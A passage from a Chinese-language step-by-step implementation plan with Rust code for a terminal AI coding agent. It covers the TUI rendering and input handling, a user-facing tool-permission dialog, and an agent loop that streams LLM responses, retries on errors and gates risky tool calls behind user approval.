            crossterm_event = tokio::task::spawn_blocking(|| event::read()) => {
                let crossterm_event = crossterm_event?;
                match crossterm_event {
                    CEvent::Key(key) => {
                        if state.show_permission_dialog.is_some() {
                            handle_permission_key(key, state, action_tx)?;
                        } else {
                            handle_input_key(key, state, action_tx).await?;
                        }
                    }
                    CEvent::Resize(_, _) => { /* 自动重绘 */ }
                    _ => {}
                }
            }

            // Agent 事件
            app_event = event_rx.recv() => {
                match app_event {
                    Some(event) => handle_app_event(event, state)?,
                    None => break, // 通道关闭
                }
            }
        }
    }

    Ok(())
}

fn handle_permission_key(
    key: KeyEvent,
    state: &mut TuiState,
    action_tx: &mut mpsc::UnboundedSender<Action>,
) -> anyhow::Result<()> {
    match key.code {
        KeyCode::Char('a') | KeyCode::Char('A') => {
            state.show_permission_dialog = None;
            action_tx.send(Action::ApproveOnce)?;
        }
        KeyCode::Char('y') | KeyCode::Char('Y') => {
            state.show_permission_dialog = None;
            action_tx.send(Action::ApproveAlways)?;
        }
        KeyCode::Char('d') | KeyCode::Char('D') | KeyCode::Esc => {
            state.show_permission_dialog = None;
            action_tx.send(Action::Deny)?;
        }
        _ => {}
    }
    Ok(())
}

async fn handle_input_key(
    key: KeyEvent,
    state: &mut TuiState,
    action_tx: &mut mpsc::UnboundedSender<Action>,
) -> anyhow::Result<()> {
    match key {
        KeyEvent { code: KeyCode::Char('s'), modifiers: KeyModifiers::CONTROL, .. } |
        KeyEvent { code: KeyCode::Enter, modifiers: _, .. } => {
            if !state.input_buffer.trim().is_empty() {
                let input = std::mem::take(&mut state.input_buffer);
                // 添加到历史（去重 + 截断）
                if state.input_history.last().map(|s| s != &input).unwrap_or(true) {
                    state.input_history.push(input.clone());
                    if state.input_history.len() > 1000 {
                        state.input_history.remove(0);
                    }
                }
                state.history_index = None;
                state.pending_input.clear();
                action_tx.send(Action::Submit(input))?;
                state.status_text = "emergence · 处理中 · ⏳ streaming".into();
            }
        }
        KeyEvent { code: KeyCode::Up, modifiers: _, .. } => {
            if !state.input_history.is_empty() {
                // 进入历史浏览模式
                if state.history_index.is_none() {
                    state.pending_input = std::mem::take(&mut state.input_buffer);
                    state.history_index = Some(state.input_history.len() - 1);
                } else if let Some(idx) = state.history_index {
                    if idx > 0 {
                        state.history_index = Some(idx - 1);
                    }
                }
                if let Some(idx) = state.history_index {
                    state.input_buffer = state.input_history[idx].clone();
                }
            }
        }
        KeyEvent { code: KeyCode::Down, modifiers: _, .. } => {
            if let Some(idx) = state.history_index {
                if idx + 1 < state.input_history.len() {
                    state.history_index = Some(idx + 1);
                    state.input_buffer = state.input_history[idx + 1].clone();
                } else {
                    // 退出历史浏览，恢复之前暂存的输入
                    state.history_index = None;
                    state.input_buffer = std::mem::take(&mut state.pending_input);
                }
            }
        }
        KeyEvent { code: KeyCode::Esc, modifiers: _, .. } => {
            state.input_buffer.clear();
            state.history_index = None;
            state.pending_input.clear();
        }
        KeyEvent { code: KeyCode::Char('c'), modifiers: KeyModifiers::CONTROL, .. } => {
            if state.streaming {
                action_tx.send(Action::Cancel)?;
            }
        }
        KeyEvent { code: KeyCode::Char(c), modifiers: _, .. } => {
            state.input_buffer.push(c);
            // 手动输入时退出历史浏览
            state.history_index = None;
            state.pending_input.clear();
        }
        KeyEvent { code: KeyCode::Backspace, modifiers: _, .. } => {
            state.input_buffer.pop();
            state.history_index = None;
            state.pending_input.clear();
        }
        KeyEvent { code: KeyCode::Tab, modifiers: _, .. } => {
            state.input_buffer.push_str("    ");
        }
        _ => {}
    }
    Ok(())
}

/// 从 ~/.emergence/history/<session-id>.json 加载输入历史
fn load_input_history() -> Vec<String> {
    // v1: 简单实现 — 返回空列表；完整版从文件加载
    Vec::new()
}

/// 保存输入历史到 ~/.emergence/history/<session-id>.json
fn save_input_history(history: &[String]) {
    // v1: 占位 — 完整版写入 JSON 文件
    let _ = history;
}

fn handle_app_event(event: AppEvent, state: &mut TuiState) -> anyhow::Result<()> {
    match event {
        AppEvent::TextDelta { content, finish_reason } => {
            state.streaming = true;
            // 找到或创建当前 assistant 消息
            if let Some(RenderedMessage::Assistant { content: ref mut existing, .. }) = state.messages.last_mut() {
                existing.push_str(&content);
            } else {
                state.messages.push(RenderedMessage::Assistant {
                    timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                    content,
                    thinking: None,
                    duration: None,
                    tokens: None,
                });
            }
        }
        AppEvent::ThinkingDelta { content } => {
            state.messages.push(RenderedMessage::Thinking { content });
        }
        AppEvent::ToolRequest { id, name, params, risk } => {
            state.show_permission_dialog = Some(PermissionDialogState {
                tool_name: name,
                risk,
                params,
                tool_id: id,
            });
        }
        AppEvent::ToolResult { id: _, name, params, output, metadata: _ } => {
            state.messages.push(RenderedMessage::ToolCall {
                tool: name,
                params: serde_json::to_string_pretty(&params).unwrap_or_default(),
                duration: None,
            });
            state.messages.push(RenderedMessage::ToolResult { output });
        }
        AppEvent::StatusUpdate { tokens, model } => {
            state.status_text = format!("emergence · {} · {} tokens · ⏳ streaming", model, tokens);
        }
        AppEvent::AgentDone { stop_reason } => {
            state.streaming = false;
            state.status_text = format!("emergence · ✓ ready ({:?})", stop_reason);
        }
        AppEvent::Error { message } => {
            state.messages.push(RenderedMessage::Error { message });
        }
    }
    Ok(())
}
```

- [ ] **步骤 3: 编写 TUI widgets 骨架**

创建 `src/tui/widgets.rs`：
```rust
use ratatui::prelude::*;
use ratatui::widgets::*;
use super::{TuiState, RenderedMessage};
use super::themes;

pub fn render(f: &mut Frame, state: &super::TuiState) {
    let layout = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Min(0),     // Chat panel
            Constraint::Length(1),  // Status bar
            Constraint::Length(3),  // Input box
        ])
        .split(f.area());

    render_chat_panel(f, layout[0], state);
    render_status_bar(f, layout[1], state);
    render_input_box(f, layout[2], state);
}

fn render_chat_panel(f: &mut Frame, area: Rect, state: &TuiState) {
    let mut lines: Vec<Line> = Vec::new();

    for msg in &state.messages {
        match msg {
            RenderedMessage::User { timestamp, content } => {
                lines.push(Line::from(vec![
                    Span::styled(format!("[{}] You: ", timestamp), themes::dim_style()),
                    Span::styled(content, themes::user_style()),
                ]));
            }
            RenderedMessage::Assistant { timestamp, content, thinking, duration, tokens } => {
                if let Some(t) = thinking {
                    lines.push(Line::from(vec![
                        Span::styled(format!("🤖 (thinking): {}", t), themes::thinking_style()),
                    ]));
                }
                let mut prefix = format!("[{}] 🤖", timestamp);
                if let Some(d) = duration {
                    prefix.push_str(&format!(" ({})", d));
                }
                if let Some(tok) = tokens {
                    prefix.push_str(&format!(" {} tokens", tok));
                }
                lines.push(Line::from(vec![
                    Span::styled(format!("{} ", prefix), themes::dim_style()),
                    Span::styled(content, themes::assistant_style()),
                ]));
            }
            RenderedMessage::ToolCall { tool, params, duration } => {
                let mut prefix = format!("🔧 tool:{}", tool);
                if let Some(d) = duration {
                    prefix.push_str(&format!(" ({})", d));
                }
                lines.push(Line::from(vec![
                    Span::styled(format!("{}: {}", prefix, params), themes::tool_style()),
                ]));
            }
            RenderedMessage::ToolResult { output } => {
                let truncated: String = output.lines().take(20).collect::<Vec<_>>().join("\n");
                lines.push(Line::from(vec![
                    Span::styled(
                        format!("┌──────────────────────────────┐\n{}└──────────────────────────────┘", truncated),
                        themes::tool_style(),
                    ),
                ]));
            }
            RenderedMessage::Thinking { content } => {
                lines.push(Line::from(vec![
                    Span::styled(format!("🤖 (thinking): {}", content), themes::thinking_style()),
                ]));
            }
            RenderedMessage::Error { message } => {
                lines.push(Line::from(vec![
                    Span::styled(format!("⚠ {}", message), themes::error_style()),
                ]));
            }
        }
    }

    let paragraph = Paragraph::new(lines)
        .block(Block::default().borders(Borders::NONE))
        .scroll((lines.len().saturating_sub(area.height as usize) as u16, 0));

    f.render_widget(paragraph, area);
}

fn render_status_bar(f: &mut Frame, area: Rect, state: &TuiState) {
    let status = Paragraph::new(state.status_text.as_str())
        .style(themes::status_bar_style());
    f.render_widget(status, area);
}

fn render_input_box(f: &mut Frame, area: Rect, state: &TuiState) {
    let input = Paragraph::new(format!("> {}", state.input_buffer))
        .block(Block::default().borders(Borders::TOP))
        .style(Style::default().fg(Color::White));
    f.render_widget(input, area);
}
```

- [ ] **步骤 4: 编写 TUI popups 骨架**

创建 `src/tui/popups.rs`：
```rust
use ratatui::prelude::*;
use ratatui::widgets::*;
use super::PermissionDialogState;
use crate::permissions::RiskLevel;

pub fn render_permission_dialog(f: &mut Frame, state: &PermissionDialogState) {
    let area = centered_rect(60, 40, f.area());

    let risk_label = match state.risk {
        RiskLevel::ReadOnly => "ReadOnly",
        RiskLevel::Write => "⚠ Write",
        RiskLevel::System => "🚫 System",
    };

    let text = format!(
        "Tool: {}\nRisk: {}\n\nParams:\n  {}\n\n[A]pprove Once  [Y]es Always  [D]eny",
        state.tool_name,
        risk_label,
        serde_json::to_string_pretty(&state.params).unwrap_or_default(),
    );

    let paragraph = Paragraph::new(text)
        .block(
            Block::default()
                .title(" Permission Required ")
                .borders(Borders::ALL)
                .style(Style::default().fg(Color::Yellow)),
        )
        .wrap(Wrap { trim: true });

    f.render_widget(Clear, area);
    f.render_widget(paragraph, area);
}

fn centered_rect(percent_x: u16, percent_y: u16, r: Rect) -> Rect {
    let popup_layout = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage((100 - percent_y) / 2),
            Constraint::Percentage(percent_y),
            Constraint::Percentage((100 - percent_y) / 2),
        ])
        .split(r);

    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage((100 - percent_x) / 2),
            Constraint::Percentage(percent_x),
            Constraint::Percentage((100 - percent_x) / 2),
        ])
        .split(popup_layout[1])[1]
}
```

- [ ] **步骤 5: 更新 themes.rs 添加缺失的 dim_style**

```rust
pub fn dim_style() -> Style {
    Style::default().fg(DEFAULT_THEME.dim)
}
```

- [ ] **步骤 6: 更新 src/lib.rs 添加 tui 模块**

```rust
pub mod tui;
```

- [ ] **步骤 7: 验证编译**

运行: `cargo build`
预期: 编译成功（可能有未使用警告）

- [ ] **步骤 8: 提交**

```bash
git add src/tui/ src/lib.rs
git commit -m "feat: 实现 TUI 层 — 主渲染循环、ChatPanel、StatusBar、InputBox、权限弹窗、主题"
```

---

### 任务 22: AgentLoop 实现（第一部分 — 初始化和状态管理）

**文件:**
- 修改: `src/app.rs`

- [ ] **步骤 1: 编写 AgentLoop 结构体和初始化**

完全替换 `src/app.rs`：

```rust
use std::sync::Arc;
use tokio::sync::{mpsc, oneshot, Mutex};
use crate::config::ConfigManager;
use crate::session::SessionManager;
use crate::tools::ToolRegistry;
use crate::commands::{CommandRegistry, CommandContext};
use crate::permissions::{PermissionStore, RiskLevel, UserChoice};
use crate::hooks::{HookRegistry, HookEvent, HookOutcome};
use crate::protocol::{Action, Event};
use crate::llm::{Provider, StreamEvent, ChatMessage, Role, Content, GenerationConfig, ToolDefinition, StopReason, Usage};
use futures::StreamExt;

/// Agent 状态机
#[derive(Debug, Clone, PartialEq)]
enum AgentState {
    Idle,
    Processing,
    Streaming,
    WaitingPermission {
        tool_name: String,
        tool_id: String,
        params: serde_json::Value,
        risk: RiskLevel,
    },
}

pub struct App {
    cli_session: Option<String>,
    cli_model: Option<String>,
}

pub struct AgentLoop {
    config: ConfigManager,
    session: SessionManager,
    tool_registry: ToolRegistry,
    command_registry: CommandRegistry,
    skill_registry: crate::skills::SkillRegistry,
    hook_registry: HookRegistry,
    permission_store: PermissionStore,
    provider_registry: crate::llm::ProviderRegistry,
    session_store: Option<Box<dyn crate::session::store::SessionStore>>,

    state: AgentState,
    model: String,
    system_prompt: String,
    stream_cancel: Option<oneshot::Sender<()>>,

    // 通信
    action_rx: mpsc::UnboundedReceiver<Action>,
    event_tx: mpsc::UnboundedSender<Event>,

    // 工具调用累计缓冲区
    tool_call_buffer: Option<(String, String, String)>, // (id, name, args)

    // LLM 错误重试计数
    retry_count: u32,
    max_retries: u32,
    /// /quit 命令或 Ctrl+C 退出标志
    should_exit: bool,
}

impl AgentLoop {
    pub fn new(
        config: ConfigManager,
        session: SessionManager,
        tool_registry: ToolRegistry,
        command_registry: CommandRegistry,
        skill_registry: crate::skills::SkillRegistry,
        hook_registry: HookRegistry,
        provider_registry: crate::llm::ProviderRegistry,
        session_store: Option<Box<dyn crate::session::store::SessionStore>>,
        action_rx: mpsc::UnboundedReceiver<Action>,
        event_tx: mpsc::UnboundedSender<Event>,
    ) -> Self {
        let model = config.settings.model.clone();

        // 初始化权限存储，从 settings.json 预加载 auto_approve 列表
        let mut permission_store = PermissionStore::new();
        for tool_name in &config.settings.permissions.auto_approve {
            // 对该工具的所有风险等级预先批准（对齐设计 §5）
            permission_store.approve_always(tool_name, RiskLevel::Write);
            permission_store.approve_always(tool_name, RiskLevel::System);
        }

        Self {
            config,
            session,
            tool_registry,
            command_registry,
            skill_registry,
            hook_registry,
            permission_store,
            provider_registry,
            session_store,
            state: AgentState::Idle,
            model,
            system_prompt: "You are a helpful coding assistant.".into(),
            stream_cancel: None,
            action_rx,
            event_tx,
            tool_call_buffer: None,
            retry_count: 0,
            max_retries: 3,
            should_exit: false,
        }
    }

    /// 主循环入口
    pub async fn run(&mut self) -> anyhow::Result<()> {
        // 发送欢迎消息
        let _ = self.event_tx.send(Event::TextDelta {
            content: "emergence v0.1.0 已就绪。输入消息开始对话...\n".into(),
            finish_reason: None,
        });

        while let Some(action) = self.action_rx.recv().await {
            match &self.state {
                AgentState::WaitingPermission { .. } => {
                    match action {
                        Action::ApproveOnce | Action::ApproveAlways | Action::Deny => {
                            self.handle_permission_response(action).await?;
                        }
                        Action::Quit => {
                            self.save_and_exit().await?;
                            return Ok(());
                        }
                        _ => {} // 忽略其他输入
                    }
                }
                _ => {
                    match action {
                        Action::Submit(input) => {
                            self.handle_submit(input).await?;
                            // 检查 /quit 命令是否触发了退出
                            if self.should_exit {
                                return Ok(());
                            }
                        }
                        Action::Cancel => {
                            self.cancel_stream();
                            // 清理当前进行中的 turn（避免残留 InProgress turn）
                            if let Some(turn) = self.session.current_turn() {
                                if turn.status == crate::session::TurnStatus::InProgress {
                                    let _ = self.session.complete_turn();
                                }
                            }
                        }
                        Action::Quit => {
                            self.save_and_exit().await?;
                            return Ok(());
                        }
                        _ => {}
                    }
                }
            }
        }

        Ok(())
    }

    /// 保存会话并退出
    async fn save_and_exit(&mut self) -> anyhow::Result<()> {
        tracing::info!("保存会话并退出");
        // 如果有进行中的 turn，完成它
        if let Some(turn) = self.session.current_turn() {
            if turn.status == crate::session::TurnStatus::InProgress {
                let _ = self.session.complete_turn();
            }
        }
        // 持久化会话
        if let Some(ref store) = self.session_store {
            if let Err(e) = store.save(self.session.session()).await {
                tracing::error!("会话保存失败: {}", e);
            }
        }
        Ok(())
    }

    /// 取消流式输出
    fn cancel_stream(&mut self) {
        if let Some(cancel) = self.stream_cancel.take() {
            let _ = cancel.send(());
        }
    }

    /// 处理用户提交
    async fn handle_submit(&mut self, input: String) -> anyhow::Result<()> {
        // 检查是否是斜杠命令
        if input.starts_with('/') {
            return self.handle_command(input).await;
        }

        // 否则作为对话消息
        if self.state != AgentState::Idle {
            // 已在处理中，忽略
            return Ok(());
        }

        self.state = AgentState::Processing;

        // 0. UserInput hook
        let _ = self.hook_registry.dispatch(&HookEvent::UserInput { text: input.clone() }).await;

        // 1. push user message
        let user_msg = ChatMessage {
            role: Role::User,
            content: Content::Text(input),
            name: None,
        };
        self.session.begin_turn(user_msg);

        // 2. 构建上下文（包含 <available_skills> 元信息）
        let tools = self.tool_registry.definitions();
        let available_skills_text = self.skill_registry.format_available_for_prompt();
        let active_contents: Vec<String> = self.session.active_skills()
            .iter()
            .filter_map(|name| self.skill_registry.load_full_content(name).ok())
            .collect();

        let messages = crate::session::context::ContextBuilder::build(
            self.session.session(),
            &self.system_prompt,
            &tools,
            &available_skills_text,
            &active_contents,
            self.config.agents_md_content.as_deref(),
        );

        // 2.5 PreLLMCall hook
        self.hook_registry.dispatch(&HookEvent::PreLLMCall { messages: messages.clone() }).await;

        // 3. 调用 LLM (含错误恢复)
        self.retry_count = 0;
        if let Err(e) = self.call_llm_with_retry(messages, &tools).await {
            let _ = self.event_tx.send(Event::Error { message: e.to_string() });
            self.state = AgentState::Idle;
        }

        Ok(())
    }

    /// 带错误恢复的 LLM 调用（对齐设计 §2 LLM 错误恢复）
    async fn call_llm_with_retry(
        &mut self,
        messages: Vec<ChatMessage>,
        tools: &[ToolDefinition],
    ) -> anyhow::Result<()> {
        loop {
            match self.call_llm_and_process(messages.clone(), tools).await {
                Ok(()) => return Ok(()),
                Err(e) => {
                    let err_msg = e.to_string();
                    // 分类错误
                    if err_msg.contains("429") || err_msg.contains("rate") {
                        if self.retry_count < self.max_retries {
                            self.retry_count += 1;
                            let delay = 5u64;
                            let _ = self.event_tx.send(Event::Error {
                                message: format!("Rate limited, {}s 后重试 ({}/{})...", delay, self.retry_count, self.max_retries),
                            });
                            tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
                            continue;
                        }
                    } else if err_msg.contains("500") || err_msg.contains("503") || err_msg.contains("server") {
                        if self.retry_count < self.max_retries {
                            self.retry_count += 1;
                            let delay = 2u64.pow(self.retry_count); // 指数退避: 2s, 4s, 8s
                            let _ = self.event_tx.send(Event::Error {
                                message: format!("服务器错误, {}s 后重试 ({}/{})...", delay, self.retry_count, self.max_retries),
                            });
                            tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
                            continue;
                        }
                    } else if err_msg.contains("timeout") || err_msg.contains("timed out") {
                        // Timeout → 重试 1 次（对齐设计 §13）
                        if self.retry_count < 1 {
                            self.retry_count += 1;
                            let _ = self.event_tx.send(Event::Error {
                                message: "请求超时，正在重试...".into(),
                            });
                            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                            continue;
                        }
                    } else if err_msg.contains("401") || err_msg.contains("403") || err_msg.contains("auth") {
                        let _ = self.event_tx.send(Event::Error {
                            message: format!("认证错误: {}。请检查 API key。", err_msg),
                        });
                        return Err(e);
                    }
                    return Err(e);
                }
            }
        }
    }

    /// 处理斜杠命令
    async fn handle_command(&mut self, input: String) -> anyhow::Result<()> {
        let mut should_quit = false;

        {
            let session_store_ref: Option<&dyn crate::session::store::SessionStore> =
                self.session_store.as_ref().map(|s| s.as_ref());

            let mut ctx = CommandContext {
                config: &mut self.config,
                session: &mut self.session,
                model: &mut self.model,
                should_quit: &mut should_quit,
                skill_registry: Some(&self.skill_registry),
                session_store: session_store_ref,
            };

            match self.command_registry.dispatch(&input, &mut ctx).await {
                Ok(output) => {
                    match output {
                        crate::commands::CommandOutput::Success { message } => {
                            let _ = self.event_tx.send(Event::TextDelta {
                                content: format!("{}\n", message),
                                finish_reason: None,
                            });
                        }
                        crate::commands::CommandOutput::Error { message } => {
                            let _ = self.event_tx.send(Event::Error { message });
                        }
                        crate::commands::CommandOutput::Quit => {
                            should_quit = true;
                        }
                        crate::commands::CommandOutput::SwitchSession { session } => {
                            // 保存当前会话，切换到新会话
                            if let Some(ref store) = self.session_store {
                                let _ = store.save(self.session.session()).await;
                            }
                            self.session = crate::session::SessionManager::load(session);
                            let _ = self.event_tx.send(Event::TextDelta {
                                content: format!("已切换到会话: {}\n", self.session.session().id),
                                finish_reason: None,
                            });
                        }
                    }
                }
                Err(e) => {
                    let _ = self.event_tx.send(Event::Error { message: e.to_string() });
                }
            }
        }

        if should_quit {
            let _ = self.event_tx.send(Event::AgentDone {
                stop_reason: StopReason::EndTurn,
            });
            self.save_and_exit().await?;
            self.should_exit = true;  // 触发 run() 循环退出
        }

        Ok(())
    }

    /// 调用 LLM 并处理响应流
    async fn call_llm_and_process(
        &mut self,
        messages: Vec<ChatMessage>,
        tools: &[ToolDefinition],
    ) -> anyhow::Result<()> {
        let provider_name = self.model.split('/').next().unwrap_or("deepseek");
        let model_name = self.model.split('/').nth(1).unwrap_or("deepseek-v4-pro");

        let provider = self.provider_registry.get(provider_name)
            .ok_or_else(|| anyhow::anyhow!("未知 provider: {}", provider_name))?;

        let gen_config = self.config.generation_config();
        let gen_config = GenerationConfig {
            tools: if tools.is_empty() { None } else { Some(tools.to_vec()) },
            ..gen_config
        };

        let (cancel_tx, mut cancel_rx) = oneshot::channel::<()>();
        self.stream_cancel = Some(cancel_tx);

        let mut stream = provider.chat(model_name, &messages, tools, &gen_config).await?;

        self.state = AgentState::Streaming;
        self.tool_call_buffer = None;  // 每次新 stream 时清空累积缓冲区

        // 流式处理循环
        loop {
            tokio::select! {
                _ = &mut cancel_rx => {
                    self.state = AgentState::Idle;
                    let _ = self.event_tx.send(Event::AgentDone {
                        stop_reason: StopReason::EndTurn,
                    });
                    return Ok(());
                }
                item = stream.next() => {
                    match item {
                        Some(Ok(event)) => {
                            if !self.process_stream_event(event, tools).await? {
                                break; // Finish 事件，退出循环
                            }
                        }
                        Some(Err(e)) => {
                            let _ = self.event_tx.send(Event::Error { message: e.to_string() });
                            break;
                        }
                        None => {
                            break; // 流结束
                        }
                    }
                }
            }
        }

        self.stream_cancel = None;
        Ok(())
    }

    /// 处理单个流事件，返回 false 表示应退出流循环
    async fn process_stream_event(
        &mut self,
        event: StreamEvent,
        tools: &[ToolDefinition],
    ) -> anyhow::Result<bool> {
        match event {
            StreamEvent::TextDelta(content) => {
                let _ = self.event_tx.send(Event::TextDelta { content, finish_reason: None });
                Ok(true)
            }
            StreamEvent::ThinkingDelta(content) => {
                let _ = self.event_tx.send(Event::ThinkingDelta { content });
                Ok(true)
            }
            StreamEvent::ToolCallDelta { id, name, arguments_json_fragment } => {
                // 累积 tool call 参数
                if let Some((_, _, ref mut args)) = &mut self.tool_call_buffer {
                    args.push_str(&arguments_json_fragment);
                } else {
                    self.tool_call_buffer = Some((id, name, arguments_json_fragment));
                }
                Ok(true)
            }
            StreamEvent::Finish { stop_reason, usage } => {
                let _ = self.event_tx.send(Event::StatusUpdate {
                    tokens: usage.input_tokens + usage.output_tokens,
                    model: self.model.clone(),
                });

                match stop_reason {
                    StopReason::ToolUse => {
                        // 处理累积的 tool call
                        if let Some((id, name, args)) = self.tool_call_buffer.take() {
                            self.handle_tool_use(id, name, args, tools).await?;
                        }
                    }
                    _ => {
                        // PostLLMCall hook（对齐设计 §10）
                        self.hook_registry.dispatch(&HookEvent::PostLLMCall {
                            response: String::new(),
                            usage: usage.clone(),
                        }).await;

                        // 完成 turn + 持久化（对齐设计 §11 数据流）
                        let _ = self.session.complete_turn();
                        if let Some(ref store) = self.session_store {
                            let _ = store.save(self.session.session()).await;
                        }

                        // 自动 compaction 检查（对齐设计 §6）
                        let threshold = self.config.settings.session.compaction_threshold_tokens;
                        if self.session.should_compact(threshold) {
                            self.session.compact(3); // 保留最近 3 个 Turn
                            let _ = self.event_tx.send(Event::Error {
                                message: format!("上下文已自动压缩。当前 token 用量: ~{}", self.session.estimated_tokens()),
                            });
                        }

                        self.state = AgentState::Idle;
                        let _ = self.event_tx.send(Event::AgentDone {
                            stop_reason: stop_reason.clone(),
                        });
                    }
                }

                Ok(false) // 退出流循环
            }
        }
    }
}
```

- [ ] **步骤 2: 验证编译**

运行: `cargo build`
预期: 编译成功（缺少 handle_tool_use 和 handle_permission_response 方法，下一步添加）

- [ ] **步骤 3: 提交将在任务 23 后一起进行**

---

### 任务 23: AgentLoop 实现（第二部分 — 工具执行和权限处理）

**文件:**
- 修改: `src/app.rs`

- [ ] **步骤 1: 添加工具执行和权限处理方法**

在 `impl AgentLoop` 中追加以下方法：

```rust
impl AgentLoop {
    // ... 已有方法 ...

    /// 处理 LLM 返回的 tool_use
    async fn handle_tool_use(
        &mut self,
        tool_id: String,
        tool_name: String,
        args_json: String,
        tools: &[ToolDefinition],
    ) -> anyhow::Result<()> {
        let params: serde_json::Value = serde_json::from_str(&args_json)?;

        // 获取风险等级
        let risk = self.tool_registry.risk_level(&tool_name, &params)
            .unwrap_or(RiskLevel::System);

        match risk {
            RiskLevel::ReadOnly => {
                // 自动执行
                self.execute_and_feedback(tool_id, tool_name, params).await?;
            }
            RiskLevel::Write | RiskLevel::System => {
                // PermissionRequested hook
                self.hook_registry.dispatch(&HookEvent::PermissionRequested {
                    tool: tool_name.clone(),
                    risk,
                }).await;

                // 检查是否已在白名单
                if self.permission_store.is_allowed(&tool_name, risk) {
                    self.execute_and_feedback(tool_id, tool_name, params).await?;
                } else {
                    // 请求用户确认
                    self.state = AgentState::WaitingPermission {
                        tool_name: tool_name.clone(),
                        tool_id: tool_id.clone(),
                        params: params.clone(),
                        risk,
                    };
                    let _ = self.event_tx.send(Event::ToolRequest {
                        id: tool_id,
                        name: tool_name,
                        params,
                        risk,
                    });
                }
            }
        }

        Ok(())
    }

    /// 构建上下文（helper，避免重复代码）
    fn build_messages(&self) -> (Vec<ChatMessage>, Vec<ToolDefinition>) {
        let tools = self.tool_registry.definitions();
        let available_skills_text = self.skill_registry.format_available_for_prompt();
        let active_contents: Vec<String> = self.session.active_skills()
            .iter()
            .filter_map(|name| self.skill_registry.load_full_content(name).ok())
            .collect();

        let messages = crate::session::context::ContextBuilder::build(
            self.session.session(),
            &self.system_prompt,
            &tools,
            &available_skills_text,
            &active_contents,
            self.config.agents_md_content.as_deref(),
        );
        (messages, tools)
    }

    /// 执行工具并将结果反馈给 LLM（对齐设计 §2 execute_tool 子流程 + §10 Hook 集成）
    async fn execute_and_feedback(
        &mut self,
        tool_id: String,
        tool_name: String,
        params: serde_json::Value,
    ) -> anyhow::Result<()> {
        // 1. PreToolExecute hook（可 Abort）
        for outcome in self.hook_registry.dispatch(&HookEvent::PreToolExecute {
            tool: tool_name.clone(),
            params: params.clone(),
        }).await {
            if let HookOutcome::Abort { reason } = outcome {
                let abort_msg = format!("工具执行被 hook 中止: {}", reason);
                let _ = self.event_tx.send(Event::Error { message: abort_msg.clone() });
                let tool_msg = ChatMessage {
                    role: Role::Tool,
                    content: Content::Text(abort_msg),
                    name: Some(tool_name.clone()),
                    tool_call_id: Some(tool_id.clone()),
                };
                let _ = self.session.push(tool_msg);
                let (messages, tools) = self.build_messages();
                self.retry_count = 0;
                let _ = self.call_llm_with_retry(messages, &tools).await;
                return Ok(());
            }
        }

        // 2. 执行工具
        let output = match self.tool_registry.execute(&tool_name, params.clone()).await {
            Ok(output) => {
                let _ = self.event_tx.send(Event::ToolResult {
                    id: tool_id.clone(),
                    name: tool_name.clone(),
                    params: params.clone(),
                    output: output.content.clone(),
                    metadata: output.metadata.clone(),
                });
                output
            }
            Err(e) => {
                let error_msg = format!("Tool 执行错误: {}", e);
                let _ = self.event_tx.send(Event::Error {
                    message: error_msg.clone(),
                });
                crate::tools::ToolOutput {
                    content: error_msg,
                    metadata: None,
                }
            }
        };

        // 3. PostToolExecute hook
        self.hook_registry.dispatch(&HookEvent::PostToolExecute {
            tool: tool_name.clone(),
            result: output.clone(),
        }).await;

        // 4. 将工具结果推入会话
        let tool_msg = ChatMessage {
            role: Role::Tool,
            content: Content::Text(output.content),
            name: Some(tool_name.clone()),
            tool_call_id: Some(tool_id.clone()),
        };
        let _ = self.session.push(tool_msg);

        // 5. 重新调用 LLM（将结果反馈给模型）
        let (messages, tools) = self.build_messages();
        self.retry_count = 0;
        if let Err(e) = self.call_llm_with_retry(messages, &tools).await {
            let _ = self.event_tx.send(Event::Error { message: e.to_string() });
            self.state = AgentState::Idle;
        }

        Ok(())
    }

    /// 处理权限弹窗的用户响应
    async fn handle_permission_response(&mut self, action: Action) -> anyhow::Result<()> {
        let (tool_name, tool_id, params, risk) = match std::mem::replace(&mut self.state, AgentState::Processing) {
            AgentState::WaitingPermission { tool_name, tool_id, params, risk } => {
                (tool_name, tool_id, params, risk)
            }
            other => {
                self.state = other;
                return Ok(());
            }
        };

        match action {
            Action::ApproveOnce => {
                self.execute_and_feedback(tool_id, tool_name, params).await?;
            }
            Action::ApproveAlways => {
                self.permission_store.approve_always(&tool_name, risk);
                self.execute_and_feedback(tool_id, tool_name, params).await?;
            }
            Action::Deny => {
                // 构造 denied 消息返回 LLM
                let denied_msg = ChatMessage {
                    role: Role::Tool,
                    content: Content::Text(format!("denied by user: {}", tool_name)),
                    name: Some(tool_name.clone()),
                    tool_call_id: Some(tool_id.clone()),
                };
                let _ = self.session.push(denied_msg);

                let (messages, tools) = self.build_messages();
                self.retry_count = 0;
                if let Err(e) = self.call_llm_with_retry(messages, &tools).await {
                    let _ = self.event_tx.send(Event::Error { message: e.to_string() });
                    self.state = AgentState::Idle;
                }
            }
            _ => {
                self.state = AgentState::WaitingPermission {
                    tool_name, tool_id, params, risk,
                };
            }
        }

        Ok(())
    }
}
```

- [ ] **步骤 2: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 3: 提交**

```bash
git add src/app.rs
git commit -m "feat: 实现 AgentLoop — 状态机、LLM 调用、流式处理、工具执行、权限处理"
```

---

### 任务 24: main.rs 入口 — 完整集成

**文件:**
- 修改: `src/main.rs`
- 修改: `src/app.rs`

- [ ] **步骤 1: 更新 src/app.rs 的 App::run 方法**

在 `src/app.rs` 中替换 `App::run` 方法：

```rust
impl App {
    pub fn new(session: Option<String>, model: Option<String>) -> anyhow::Result<Self> {
        Ok(Self {
            cli_session: session,
            cli_model: model,
        })
    }

    pub async fn run(&self) -> anyhow::Result<()> {
        let home_dir = dirs_functions::home_dir()
            .unwrap_or_else(|| std::path::PathBuf::from("."));
        let project_dir = std::env::current_dir()?;

        // 1. 加载配置
        let config = ConfigManager::load(
            home_dir.clone(),
            project_dir.clone(),
            self.cli_model.clone(),
        )?;

        // 2. 加载 Skill 注册表
        let skill_registry = crate::skills::SkillRegistry::load_default()
            .unwrap_or_else(|_| crate::skills::SkillRegistry::new());

        // 3. 创建 SessionStore（持久化）
        let store_dir = config.session_store_dir();
